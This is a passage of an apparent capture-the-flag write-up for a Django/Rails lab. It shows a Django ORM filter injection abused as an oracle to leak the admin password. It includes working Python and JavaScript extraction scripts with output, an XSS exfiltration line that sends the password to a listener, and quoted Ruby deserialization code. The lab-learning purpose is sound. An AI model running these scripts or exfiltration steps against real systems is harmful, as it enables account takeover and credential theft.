+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self, request, format<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;all&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>                contracts <span style="color:#f92672">=</span> Contract<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>all()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                filtered_data <span style="color:#f92672">=</span> {key: value <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>items() <span style="color:#66d9ef">if</span> key <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;all&#34;</span>}
+</span></span><span style="display:flex;"><span>                contracts <span style="color:#f92672">=</span> Contract<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>filter(<span style="color:#f92672">**</span>filtered_data)
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>            serializer <span style="color:#f92672">=</span> ContractSerializer(contracts, many<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> Response({<span style="color:#e6db74">&#34;error&#34;</span>: str(e)}, status<span style="color:#f92672">=</span>status<span style="color:#f92672">.</span>HTTP_400_BAD_REQUEST)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Response(serializer<span style="color:#f92672">.</span>data, status<span style="color:#f92672">=</span>status<span style="color:#f92672">.</span>HTTP_200_OK)
+</span></span></code></pre></div><p>The following line of code is very interesting, as it passes all our arguments to the ORM filter function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>contracts <span style="color:#f92672">=</span> Contract<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>filter(<span style="color:#f92672">**</span>filtered_data)
+</span></span></code></pre></div><p><a href="https://www.elttam.com/blog/plormbing-your-django-orm/" target="_blank">This article</a>  demonstrates a vulnerability in this particular behavior.
+The <em>filter</em> method allows you to follow the symbolic links between the various models in the application, so you can filter the search by conditions on the attributes of the linked models and not the original model.</p>
+<p>Here&rsquo;s the <code>model</code> contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Contract</span>(models<span style="color:#f92672">.</span>Model):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Status</span>(models<span style="color:#f92672">.</span>TextChoices):
+</span></span><span style="display:flex;"><span>        DRAFT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;draft&#39;</span>, <span style="color:#e6db74">&#39;Draft&#39;</span>
+</span></span><span style="display:flex;"><span>        PENDING_REVIEW <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pending_review&#39;</span>, <span style="color:#e6db74">&#39;Pending Review&#39;</span>
+</span></span><span style="display:flex;"><span>        APPROVED <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;approved&#39;</span>, <span style="color:#e6db74">&#39;Approved&#39;</span>
+</span></span><span style="display:flex;"><span>        ACTIVE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;active&#39;</span>, <span style="color:#e6db74">&#39;Active&#39;</span>
+</span></span><span style="display:flex;"><span>        COMPLETED <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;completed&#39;</span>, <span style="color:#e6db74">&#39;Completed&#39;</span>
+</span></span><span style="display:flex;"><span>        CANCELLED <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cancelled&#39;</span>, <span style="color:#e6db74">&#39;Cancelled&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    title <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>CharField(max_length<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>, help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Title of the contract&#34;</span>)
+</span></span><span style="display:flex;"><span>    description <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>TextField(help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Detailed description of the contract&#34;</span>)
+</span></span><span style="display:flex;"><span>    start_date <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>DateField(help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Start date of the contract&#34;</span>)
+</span></span><span style="display:flex;"><span>    end_date <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>DateField(help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;End date of the contract&#34;</span>, null<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, blank<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>CharField(
+</span></span><span style="display:flex;"><span>        max_length<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>,
+</span></span><span style="display:flex;"><span>        choices<span style="color:#f92672">=</span>Status<span style="color:#f92672">.</span>choices,
+</span></span><span style="display:flex;"><span>        default<span style="color:#f92672">=</span>Status<span style="color:#f92672">.</span>DRAFT,
+</span></span><span style="display:flex;"><span>        help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Current status of the contract&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    created_at <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>DateTimeField(auto_now_add<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    updated_at <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>DateTimeField(auto_now<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>ForeignKey(
+</span></span><span style="display:flex;"><span>        settings<span style="color:#f92672">.</span>AUTH_USER_MODEL,
+</span></span><span style="display:flex;"><span>        on_delete<span style="color:#f92672">=</span>models<span style="color:#f92672">.</span>CASCADE,
+</span></span><span style="display:flex;"><span>        related_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;contracts&#39;</span>,
+</span></span><span style="display:flex;"><span>        help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;User who owns the contract&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    terms <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>TextField(help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Terms and conditions of the contract&#34;</span>)
+</span></span><span style="display:flex;"><span>    amount <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>DecimalField(max_digits<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, decimal_places<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Total contract amount&#34;</span>)
+</span></span><span style="display:flex;"><span>    attachments <span style="color:#f92672">=</span> models<span style="color:#f92672">.</span>FileField(upload_to<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;contracts/attachments/&#39;</span>, null<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, blank<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Any associated documents or files&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __str__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>title<span style="color:#e6db74">}</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>get_status_display()<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
+</span></span></code></pre></div><p>As you can see, <code>Contract</code> refers to <code>settings.AUTH_USER_MODEL</code> via the <code>owner</code> parameter. This makes it possible to perform a search filter on the attributes of <code>owner</code>.</p>
+<p>For example, the following filter only displays contracts where the contract creator starts with <code>randomusername</code>.</p>
+<ul>
+<li><strong>/contracts/manage?owner__username__startswith=randomusername</strong></li>
+</ul>
+<p>Obviously, no contract was found:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>No contracts found based on the current filter.
+</span></span></code></pre></div><p>However, it is possible to filter on the password and count the number of contracts returned.
+Start by selecting the victim user: <code>owner__username__startswith=admin</code>.
+Finally, we test the beginning of the password letter by letter and count the number of contracts found.</p>
+<ul>
+<li><code>owner__password__startswith=a</code></li>
+<li><code>owner__password__startswith=b</code></li>
+<li><code>owner__password__startswith=c</code></li>
+<li>&hellip;</li>
+</ul>
+<p>This oracle allows us to retrieve the password of any user!</p>
+<p>All that&rsquo;s missing is some python code to test the vulnerability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:1337&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_admin_password</span>(token):
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>update({<span style="color:#e6db74">&#39;_contract_frontend_session&#39;</span>: token})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filter</span>(filters):
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/contracts/manage&#39;</span>,params<span style="color:#f92672">=</span>filters)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>        cnt <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&lt;a href=&#34;/contracts/(.*)&#34;&#39;</span>, r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> len(cnt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    known <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        before <span style="color:#f92672">=</span> known
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> guess <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_lowercase:
+</span></span><span style="display:flex;"><span>            x <span style="color:#f92672">=</span> filter(filters<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;owner__password__startswith&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>known<span style="color:#e6db74">}{</span>guess<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;owner__username__startswith&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>                known <span style="color:#f92672">+=</span> guess
+</span></span><span style="display:flex;"><span>                print(known)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> before <span style="color:#f92672">==</span> known:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> known
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>admin_password <span style="color:#f92672">=</span> leak_admin_password(token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2b794bccd12cf636bb1f7faba8c19922&#34;</span>)
+</span></span><span style="display:flex;"><span>print(admin_password)
+</span></span></code></pre></div><p><em>(The token provided is a session token for <code>contract_manager</code>)</em></p>
+<p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/Desktop/tmp/HTB/web_encoDecept » python3 solve1.py                                                                                vozec@Vozec-tower
+</span></span><span style="display:flex;"><span>l
+</span></span><span style="display:flex;"><span>lt
+</span></span><span style="display:flex;"><span>ltp
+</span></span><span style="display:flex;"><span>ltpu
+</span></span><span style="display:flex;"><span>ltpuc
+</span></span><span style="display:flex;"><span>ltpuce
+</span></span><span style="display:flex;"><span>ltpucep
+</span></span><span style="display:flex;"><span>ltpucepu
+</span></span><span style="display:flex;"><span>ltpucepuv
+</span></span><span style="display:flex;"><span>ltpucepuvy
+</span></span><span style="display:flex;"><span>ltpucepuvyv
+</span></span><span style="display:flex;"><span>ltpucepuvyvv
+</span></span><span style="display:flex;"><span>ltpucepuvyvvg
+</span></span><span style="display:flex;"><span>ltpucepuvyvvga
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgae
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaem
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemi
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemit
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitg
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgm
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgme
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeu
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuz
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzr
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzrs
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzrst
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzrstj
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzrstjn
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzrstjnp
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzrstjnpr
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzrstjnpre
+</span></span><span style="display:flex;"><span>ltpucepuvyvvgaemitgmeuzrstjnprex
+</span></span></code></pre></div><p>It works!
+Now we need to redo it in js so we can chain it with the XSS from the first step.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://127.0.0.1:1337&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">leakAdminPassword</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">filters</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(<span style="color:#a6e22e">filters</span>).<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/contracts/manage?</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,{<span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>});
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">ok</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">matches</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/&lt;a href=\&#34;\/contracts\/(.*?)\&#34;/g</span>) <span style="color:#f92672">||</span> [];
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">matches</span>.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">`Unexpected status code: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">status</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error during filter request:&#39;</span>, <span style="color:#a6e22e">error</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">known</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">alphabet</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">before</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">known</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">guess</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">alphabet</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">filters</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;owner__password__startswith&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">known</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">guess</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;owner__username__startswith&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>            };
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">count</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">filters</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">count</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">known</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">guess</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">known</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">before</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">known</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">known</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Leaking admin password&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leakAdminPassword</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Admin password:&#39;</span>, <span style="color:#a6e22e">password</span>);
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><p><img src="./img/image-19.png" alt="Admin pwd leaked"></p>
+<p>Don&rsquo;t forget to add a means of exfiltrating the <strong>password</strong>, and you&rsquo;re ready to send it via <strong>XSS</strong>!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://127.0.0.1:3333/?password=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span></code></pre></div><p><img src="./img/image-20.png" alt="Admin password stealed"></p>
+<p>The password is stolen and we are now <code>admin</code> !</p>
+<p><img src="./img/image-21.png" alt="admin account"></p>
+<h2 id="fourth-vulnerability">Fourth vulnerability</h2>
+<p><strong>Administrator</strong> privileges allow us to create, modify and delete templates. We can view the associated ruby code:</p>
+<ul>
+<li><strong>./contract_frontend/app/controllers/contract_templates_controller.rb</strong></li>
+</ul>
+<h4 id="create">Create:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>
+</span></span><span style="display:flex;"><span>    user_data <span style="color:#f92672">=</span> current_user
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unless</span> user_data <span style="color:#f92672">&amp;&amp;</span> user_data<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>      flash<span style="color:#f92672">[</span><span style="color:#e6db74">:alert</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;User must be logged in to create a template.&#34;</span>
+</span></span><span style="display:flex;"><span>      redirect_to login_path <span style="color:#f92672">and</span> <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    puts <span style="color:#e6db74">&#34;Content&#34;</span>
+</span></span><span style="display:flex;"><span>    puts params<span style="color:#f92672">[</span><span style="color:#e6db74">:content</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    serialized_content <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(params<span style="color:#f92672">[</span><span style="color:#e6db74">:content</span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>    puts <span style="color:#e6db74">&#34;serialized_content&#34;</span>
+</span></span><span style="display:flex;"><span>    puts serialized_content<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;H*&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    detection_gadget_chain <span style="color:#f92672">=</span> create_detection_gadget_chain(<span style="color:#e6db74">&#34;4nsntd6bop7hso2g38b0w5wvtmzdn5bu.oastify.com)&#34;</span>)
+</span></span><span style="display:flex;"><span>    puts <span style="color:#e6db74">&#34;detection_gadget_chain&#34;</span>
+</span></span><span style="display:flex;"><span>    puts detection_gadget_chain<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;H*&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>auth(<span style="color:#e6db74">&#34;Token </span><span style="color:#e6db74">#{</span>session<span style="color:#f92672">[</span><span style="color:#e6db74">:token</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://localhost:8080/api/contract_templates/&#34;</span>, <span style="color:#e6db74">json</span>: { <span style="color:#e6db74">data</span>: serialized_content, <span style="color:#e6db74">user_id</span>: user_data<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>merge(params<span style="color:#f92672">.</span>to_unsafe_h))
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status<span style="color:#f92672">.</span>success?
+</span></span><span style="display:flex;"><span>      flash<span style="color:#f92672">[</span><span style="color:#e6db74">:notice</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Template created successfully.&#34;</span>
+</span></span><span style="display:flex;"><span>      redirect_to contract_templates_path
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      flash<span style="color:#f92672">.</span>now<span style="color:#f92672">[</span><span style="color:#e6db74">:alert</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to create template.&#34;</span>
+</span></span><span style="display:flex;"><span>      render <span style="color:#e6db74">:new</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><h4 id="show">Show:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>
